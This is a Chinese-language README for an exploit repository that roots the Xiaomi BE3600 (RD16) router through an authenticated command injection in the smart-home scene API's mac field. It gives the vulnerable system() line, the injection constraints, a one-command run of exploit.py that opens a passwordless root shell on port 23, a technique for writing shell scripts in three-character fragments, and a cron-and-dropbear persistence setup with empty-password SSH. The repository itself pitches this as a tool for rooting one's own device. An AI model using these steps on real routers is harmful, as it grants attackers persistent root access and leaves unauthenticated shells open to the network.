# Xiaomi BE3600 (RD16) — SmartHome Scene 命令注入 → Root Shell / SSH

> 已验证设备：**Xiaomi BE3600 路由器（内部型号 RD16，中国版）**
> 已验证固件：**MIUI ROM 1.0.41 release**（2025-04-01 构建，Qualcomm IPQ5312 / ARMv7 / OpenWrt 18.06 / busybox 1.36.1）
> 漏洞类型：**认证后命令注入**（需要 Web 管理密码）
> 影响：拿到 root shell 并可持久化 SSH
>
> English: [README.en.md](README.en.md)

## 漏洞概述

`api/xqsmarthome/request_smartcontroller` 的 `scene_setting` 允许注册一个由多个 `wan_block` action 组成的场景（scene）。`wan_block` 的 `payload.mac` 字段会被 `smartcontroller` 守护进程**未做任何转义地拼进 `system()`** 命令行：

```
/usr/sbin/sysapi macfilter set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit
```

`mac` 值里插入 `\n` 就能把后续的注入命令以独立 shell 行执行（root 权限）。

XMiR-Patcher 等历史注入点（`start_binding` 等）在本固件已全部修复，这条 `wan_block` 通道是 1.0.41 上目前唯一实测可用的注入面。

## 约束（实测）

| 约束 | 说明 |
|---|---|
| 命令长度 | 注入命令 ≤18 字符（fortify snprintf 边界，超限 daemon 崩溃） |
| 禁用字符 | `' " ; | $ &` 反引号 `\`；`\n` 经 JSON 双层转义可注入真换行 |
| 场景结构 | 每场景只放 1 个 action（多 action 会崩 daemon） |
| 持久进程 | `system()` 等待管道 EOF——长驻进程须先写入文件或交给 procd |
| 数字结尾碎片 | `echo -n ..D>/tmp/N`（D 为数字）会被当成 `D>` fd 重定向，需在 `>` 前加空格 |
| 可写区域 | `/etc` 是 ramfs（重启全清）；`/data` 是 UBIFS、`/etc/crontabs` 挂 sec_cfg ext4——后两者重启持久 |

## 快速复现

```bash
git clone <this-repo> && cd xiaomi-be3600-rd16-ssh
python3 exploit.py --ip 192.168.31.1 --password '你的管理密码' --stage shell
# 之后: nc <路由器IP> 23  →  root /bin/sh
```

可选阶段：

- `--stage shell`：写入 `/etc/inetd.conf` 并启动 inetd，端口 23 即 root shell（无密码）
- `--stage persist`：把密钥与看门狗脚本放 `/data`，`/etc/crontabs/root` 加一行 `* * * * * sh /data/persist.sh`，重启后 ~1 分钟自动恢复 SSH + shell

## 原理（碎片写入法）

18 字符塞不下有用命令，所以把脚本拆成 ≤3 字符的碎片：

```sh
echo -n nvr>/tmp/0     # 文件 /tmp/0 = "nvr"
echo -n am >/tmp/1     # "am "  →  参数拆分产生空格
echo -n 2 >/tmp/2      # 数字结尾须加空格，否则成 fd 重定向
cat /tmp/?>/tmp/x      # 按 glob 序拼回
sh /tmp/x
```

空格用 `echo -n A B`（两个参数之间天然产生一个空格）注入；换行用不带 `-n` 的 `echo` 收尾。

## 持久化细节

- `/etc` 是 ramfs，重启回到 squashfs 初始态 → 所有运行期配置放 `/data`
- `/etc/crontabs/` 挂载到 `/dev/mapper/sec_cfg`（ext4），重启持久 → 加每分钟执行的看门狗行即可
- hostkey 生成一次存 `/data/dropbear_rsa_host_key`，看门狗发现 dropbear 不在就重启它
- `dropbear -B` 允许空密码登录；密码认证建议另设（此固件 musl 不支持 `$6$` sha512，用 `$1$` md5）

## 涉及文件

- `exploit.py` — 单文件工具（stdlib only），完成登录→注入→inetd→(可选)持久化
- `docs/TECHNICAL.md` — 注入点源码定位、限制推导、备选通道（中文）
- `docs/TECHNICAL_EN.md` — 上述技术细节的英文版
- `README.en.md` — 英文版说明

## 免责声明

仅用于你自己拥有/被授权的设备。这是一个**认证后**漏洞（需管理密码），不属于未授权 RCE；如果你发现同接口的未授权绕过，请走厂商协调披露渠道。

## License

MIT
